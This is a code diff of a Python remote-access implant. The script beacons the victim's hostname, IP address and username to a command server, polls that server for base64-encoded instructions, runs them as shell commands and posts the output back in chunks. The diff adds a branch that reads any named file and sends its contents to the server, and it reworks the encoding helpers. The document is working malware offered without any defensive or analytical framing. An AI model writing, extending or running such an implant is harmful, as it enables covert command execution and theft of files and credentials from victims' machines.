@@ -20,12 +20,8 @@ def _g(s,d):
   return req.urlopen(s+'?'+parse.urlencode(d)).read().decode(X)
 def _p(s,d):
   return req.urlopen(req.Request(s,parse.urlencode(d).encode(X))).read().decode(X)
-def _64d(s):
-  return base64.b64decode(s.encode(X)).decode(X)
-def _64e(s):
-  return base64.b64encode(s.encode(X)).decode(X)
 s_i=0
-u=_g(srv[s_i],{'i':_64e('|'.join([socket.gethostname(),socket.gethostbyname(socket.gethostname()),getpass.getuser()]))})
+u=_g(srv[s_i],{'i':base64.b64encode('|'.join([socket.gethostname(),socket.gethostbyname(socket.gethostname()),getpass.getuser()]).encode(X)).decode(X)})
 print('python = {0}'.format(str(sys.version_info.major)))
 print('uuid = {0}'.format(u))
 while 1:
@@ -36,28 +32,30 @@ while 1:
     d=_g(srv[s_i],{'u':u})
     if d:
       break
-    time.sleep(random.randint(D))
+    time.sleep(random.randint(1,D))
   while 1:
     b.append(d)
-    print('master data = {0}'.format(d))
     d=_g(srv[s_i],{'u':u})
     if not d:
       break
-  x=''.join(b).split('|')
   r=''
-  if x[0]=='0':
-    try:
-      print('running command: {0}'.format(_64d(x[1])))
-      r=_64e(_x(_64d(x[1]),stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=1))
-    except Exception as e:
-      r=_64e(str(e))
-  elif x[0]=='1':
-    pass
-  elif x[0]=='2':
-    pass
+  try:
+    if b[0][0]=='0':
+      print('running command: {0}'.format(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X)))
+      r=base64.b64encode(_x(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X),stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=1).encode(X)).decode(X)
+    elif b[0][0]=='1':
+      pass
+    elif b[0][0]=='2':
+      print('uploading file: {0}'.format(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X)))
+      f=open(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X),'rb')
+      r=base64.b64encode(f.read()).decode(X)
+      f.close()
+  except Exception as e:
+    r=base64.b64encode(str(e).encode(X)).decode(X)
+  print('number of chunks: {0}'.format(len([r[i:i+N] for i in range(0,len(r),N)])))
   for c in [r[i:i+N] for i in range(0,len(r),N)]:
-    print('sending chunk: {0}'.format(c))
     _p(srv[s_i],{'u':u,'d':c})
   _p(srv[s_i],{'u':u,'d':''})
+  print('DONE')
 
 
